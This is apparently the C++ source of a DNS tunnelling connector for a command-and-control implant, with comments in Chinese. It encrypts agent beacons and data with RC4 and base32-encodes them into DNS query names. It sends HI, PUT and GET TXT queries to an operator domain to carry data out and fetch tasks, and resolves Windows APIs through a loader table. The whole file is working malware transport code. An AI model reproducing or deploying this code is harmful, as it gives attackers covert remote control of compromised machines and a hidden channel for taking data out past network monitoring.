#include "ConnectorDNS.h"
#include "Crypt.h"
#include "utils.h"
#include "ApiLoader.h"

extern "C" int __cdecl _snprintf(char*, size_t, const char*, ...);

static void ToHex32(ULONG value, CHAR out[9])
{
	static const CHAR hex[] = "0123456789abcdef";
	for (int i = 7; i >= 0; --i) {
		out[i] = hex[value & 0x0F];
		value >>= 4;
	}
	out[8] = '\0';
}

static ULONG DnsBase32Encode(const BYTE* src, ULONG srcLen, CHAR* dst, ULONG dstSize)
{
	static const CHAR alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
	ULONG bitBuffer = 0;
	int   bitCount  = 0;
	ULONG outLen    = 0;

	for (ULONG i = 0; i < srcLen; ++i) {
		bitBuffer = (bitBuffer << 8) | src[i];
		bitCount += 8;
		while (bitCount >= 5) {
			bitCount -= 5;
			if (outLen + 1 >= dstSize)
				return 0;
			ULONG index = (bitBuffer >> bitCount) & 0x1F;
			dst[outLen++] = alphabet[index];
		}
	}

	if (bitCount > 0) {
		if (outLen + 1 >= dstSize)
			return 0;
		ULONG index = (bitBuffer << (5 - bitCount)) & 0x1F;
		dst[outLen++] = alphabet[index];
	}

	if (outLen < dstSize)
		dst[outLen] = '\0';
	return outLen;
}

static void BuildQName(const CHAR* sid, const CHAR* op, ULONG seq, ULONG idx, const CHAR* dataLabel, const CHAR* domain, CHAR* out, ULONG outSize)
{
	CHAR seqHex[9];
	CHAR idxHex[9];
	ToHex32(seq, seqHex);
	ToHex32(idx, idxHex);

	// 如果没有 dataLabel，就用单个短 label 占位，避免出现 ".." 连续点
	const CHAR* dataPart = (dataLabel && dataLabel[0]) ? dataLabel : "x";
	const CHAR* domPart  = (domain && domain[0]) ? domain : "";

	if (domPart[0])
		_snprintf(out, outSize, "%s.%s.%s.%s.%s.%s", sid, op, seqHex, idxHex, dataPart, domPart);
	else
		_snprintf(out, outSize, "%s.%s.%s.%s.%s", sid, op, seqHex, idxHex, dataPart);
}

static int EncodeDnsName(const CHAR* host, BYTE* buf, int bufSize)
{
	// 把 "a.b.c" 变成 [1]a[1]b[1]c[0]
	int len = 0;
	const CHAR* p = host;
	while (*p && len < bufSize - 1) {
		const CHAR* labelStart = p;
		int labelLen = 0;
		while (*p && *p != '.' && len + 1 + labelLen < bufSize - 1) {
			++p;
			++labelLen;
		}
		if (labelLen == 0)
			break;
		buf[len++] = (BYTE)labelLen;
		if (len + labelLen >= bufSize)
			return -1;
		memcpy(buf + len, labelStart, labelLen);
		len += labelLen;
		if (*p == '.')
			++p;
	}
	if (len >= bufSize)
		return -1;
	buf[len++] = 0;
	return len;
}

static BOOL DnsQueryTxt(const CHAR* qname, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
	*outSize = 0;
	if (!ApiWin || !ApiWin->WSAStartup || !ApiWin->socket || !ApiWin->sendto || !ApiWin->recvfrom || !ApiWin->closesocket)
		return FALSE;

	WSADATA wsaData;
	if (ApiWin->WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		return FALSE;

	SOCKET s = ApiWin->socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (s == INVALID_SOCKET) {
		ApiWin->WSACleanup();
		return FALSE;
	}

	// 解析 resolver，暂时只支持 IPv4 文本或默认 8.8.8.8
	CHAR resolver[64];
	memset(resolver, 0, sizeof(resolver));
	// 这里不直接使用 profile.resolvers，以保持简单；可在之后版本接入配置
	_snprintf(resolver, sizeof(resolver), "8.8.8.8");

	HOSTENT* he = ApiWin->gethostbyname(resolver);
	if (!he || !he->h_addr_list || !he->h_addr_list[0]) {
		ApiWin->closesocket(s);
		ApiWin->WSACleanup();
		return FALSE;
	}

	sockaddr_in addr;
	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(53);
	memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);

	BYTE query[512];
	memset(query, 0, sizeof(query));
	USHORT id = (USHORT)(GetTickCount() & 0xFFFF);
	query[0] = (BYTE)(id >> 8);
	query[1] = (BYTE)(id & 0xFF);
	query[2] = 0x01; // recursion desired
	query[3] = 0x00;
	query[4] = 0x00;
	query[5] = 0x01; // QDCOUNT = 1

	int offset = 12;
	int nameLen = EncodeDnsName(qname, query + offset, sizeof(query) - offset - 4);
	if (nameLen < 0) {
		ApiWin->closesocket(s);
		ApiWin->WSACleanup();
		return FALSE;
	}
	offset += nameLen;
	// QTYPE TXT (16), QCLASS IN (1)
	query[offset++] = 0x00;
	query[offset++] = 0x10;
	query[offset++] = 0x00;
	query[offset++] = 0x01;

	int sent = ApiWin->sendto(s, (const char*)query, offset, 0, (sockaddr*)&addr, sizeof(addr));
	if (sent != offset) {
		ApiWin->closesocket(s);
		ApiWin->WSACleanup();
		return FALSE;
	}

	BYTE resp[1024];
	memset(resp, 0, sizeof(resp));
	int addrLen = sizeof(addr);
	int recvLen = ApiWin->recvfrom(s, (char*)resp, sizeof(resp), 0, (sockaddr*)&addr, &addrLen);
	ApiWin->closesocket(s);
	ApiWin->WSACleanup();
	if (recvLen <= 0)
		return FALSE;

	// 解析第一个 TXT RR
	if (recvLen < 12)
		return FALSE;
	int qdcount = (resp[4] << 8) | resp[5];
	int ancount = (resp[6] << 8) | resp[7];
	int pos = 12;
	// 跳过所有 question
	for (int qi = 0; qi < qdcount; ++qi) {
		// 跳过 name
		while (pos < recvLen && resp[pos] != 0) {
			if ((resp[pos] & 0xC0) == 0xC0) { // 压缩指针
				pos += 2;
				break;
			}
			pos += resp[pos] + 1;
		}
		pos++; // 终止 0
		pos += 4; // QTYPE+QCLASS
	}

	// 解析第一个 answer
	for (int ai = 0; ai < ancount; ++ai) {
		if (pos + 12 > recvLen)
			return FALSE;
		// name（可能是压缩指针）
		if ((resp[pos] & 0xC0) == 0xC0)
			pos += 2;
		else {
			while (pos < recvLen && resp[pos] != 0) {
				pos += resp[pos] + 1;
			}
			pos++;
		}
		USHORT type = (resp[pos] << 8) | resp[pos + 1];
		pos += 2; // TYPE
		pos += 2; // CLASS
		pos += 4; // TTL
		USHORT rdlen = (resp[pos] << 8) | resp[pos + 1];
		pos += 2;
		if (pos + rdlen > recvLen)
			return FALSE;
		if (type == 16 && rdlen > 0) { // TXT
			// TXT RDATA: <len><data>
			BYTE txtLen = resp[pos];
			if (txtLen > rdlen - 1)
				txtLen = (BYTE)(rdlen - 1);
			if (txtLen > 0 && txtLen <= outBufSize) {
				memcpy(outBuf, resp + pos + 1, txtLen);
				*outSize = txtLen;
				return TRUE;
			}
		}
		pos += rdlen;
	}
	return FALSE;
}

ConnectorDNS::ConnectorDNS()
{
    // For now, just zero-initialized by the default member initializer list.
}

BOOL ConnectorDNS::SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize)
{
    // cache profile
    this->profile = profile;

    // copy encrypt key (expect up to 16 bytes)
    if (!profile.encrypt_key)
        return FALSE;
    memset(this->encryptKey, 0, sizeof(this->encryptKey));
    ULONG keyLen = StrLenA((CHAR*)profile.encrypt_key);
    if (keyLen > 16)
        keyLen = 16;
    memcpy(this->encryptKey, profile.encrypt_key, keyLen);

    // pkt size and basic bounds
    this->pktSize = profile.pkt_size ? profile.pkt_size : 1024;
    if (this->pktSize > 64000)
        this->pktSize = 64000;

    // domain/qtype
    if (profile.domain)
        lstrcpynA(this->domain, (CHAR*)profile.domain, sizeof(this->domain));
    else
        this->domain[0] = 0;

    if (profile.qtype)
        lstrcpynA(this->qtype, (CHAR*)profile.qtype, sizeof(this->qtype));
    else
        lstrcpynA(this->qtype, (CHAR*)"TXT", sizeof(this->qtype));

    // derive sid from decrypted beat first 8 bytes (agent_type, agent_id)
    if (!beat || !beatSize || beatSize < 8)
        return FALSE;

    BYTE* beatCopy = (BYTE*)MemAllocLocal(beatSize);
    if (!beatCopy)
        return FALSE;
    memcpy(beatCopy, beat, beatSize);

    // beat is already RC4-encrypted with config->encrypt_key on Agent side,
    // so here we decrypt it with the same key to get clear agent_id.
    EncryptRC4(beatCopy, beatSize, this->encryptKey, 16);

    ULONG agentId = *(ULONG*)(beatCopy + 4);
    MemFreeLocal((LPVOID*)&beatCopy, beatSize);

    _snprintf(this->sid, sizeof(this->sid), "%08x", agentId);

    this->initialized = TRUE;
    return TRUE;
}

void ConnectorDNS::CloseConnector()
{
    // Free any allocated receive buffer.
    if (this->recvData) {
        // Using HeapFree / LocalFree would require function pointers
        // similar to other connectors; for this stub we simply ignore
        // allocator details and reset the pointer/state.
        this->recvData = NULL;
        this->recvSize = 0;
    }
}

void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
{
	this->recvData = NULL;
	this->recvSize = 0;

	if (!this->initialized)
		return;

	CHAR qname[1024] = { 0 };
	CHAR dataLabel[512] = { 0 };
	ULONG maxBuf = this->pktSize;
	if (data_size && maxBuf > data_size)
		maxBuf = data_size;

	// HI：第一次带 beat 的调用
	if (!this->hiSent && data && data_size) {
		BYTE* encBuf = (BYTE*)MemAllocLocal(maxBuf);
		if (!encBuf)
			return;
		memcpy(encBuf, data, maxBuf);
		EncryptRC4(encBuf, maxBuf, this->encryptKey, 16);
		if (!DnsBase32Encode(encBuf, maxBuf, dataLabel, sizeof(dataLabel))) {
			MemFreeLocal((LPVOID*)&encBuf, maxBuf);
			return;
		}
		MemFreeLocal((LPVOID*)&encBuf, maxBuf);

		BuildQName(this->sid, "HI", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
		BYTE tmp[512];
		ULONG tmpSize = 0;
		DnsQueryTxt(qname, tmp, sizeof(tmp), &tmpSize);
		this->hiSent = TRUE;
		return;
	}

	// 之后所有有数据的调用视为 PUT
	if (data && data_size) {
		BYTE* encBuf = (BYTE*)MemAllocLocal(maxBuf);
		if (!encBuf)
			return;
		memcpy(encBuf, data, maxBuf);
		// 此处数据已由上层用 SessionKey RC4 过，不再额外加密，直接 base32 编码
		if (!DnsBase32Encode(encBuf, maxBuf, dataLabel, sizeof(dataLabel))) {
			MemFreeLocal((LPVOID*)&encBuf, maxBuf);
			return;
		}
		MemFreeLocal((LPVOID*)&encBuf, maxBuf);

		BuildQName(this->sid, "PUT", ++this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
		BYTE tmp[512];
		ULONG tmpSize = 0;
		DnsQueryTxt(qname, tmp, sizeof(tmp), &tmpSize);
		return;
	}

	// 空数据：GET 下行任务
	BuildQName(this->sid, "GET", ++this->seq, this->idx, "", this->domain, qname, sizeof(qname));
	BYTE respBuf[1024];
	ULONG respSize = 0;
	if (DnsQueryTxt(qname, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
		this->recvData = (BYTE*)MemAllocLocal(respSize);
		if (!this->recvData)
			return;
		memcpy(this->recvData, respBuf, respSize);
		this->recvSize = (int)respSize;
	}
}

BYTE* ConnectorDNS::RecvData()
{
    return this->recvData;
}

int ConnectorDNS::RecvSize()
{
    return this->recvSize;
}

void ConnectorDNS::RecvClear()
{
    this->recvData = NULL;
    this->recvSize = 0;
}
